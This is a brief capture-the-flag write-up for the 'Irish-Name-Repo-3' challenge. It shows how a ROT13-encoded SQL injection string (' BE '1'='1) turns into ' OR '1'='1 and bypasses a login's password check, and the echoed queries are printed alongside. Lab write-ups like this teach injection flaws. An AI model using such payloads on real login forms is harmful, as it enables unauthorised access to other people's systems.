# Irish-Name-Repo-3

The login form is different from the [Prev](./Irish-Name-Repo-2.md) challenge

On trying to log in:

```text
password: pass
SQL query: SELECT * FROM admin where password = 'cnff'
```

Trying SQL injection:

```text
password: ' OR '1'='1
SQL query: SELECT * FROM admin where password = '' BE '1'='1'
```

Clearly, the alphabetical characters are being shifted, so enter a shifted password:

```text
password: ' BE '1'='1
SQL query: SELECT * FROM admin where password = '' OR '1'='1'
```
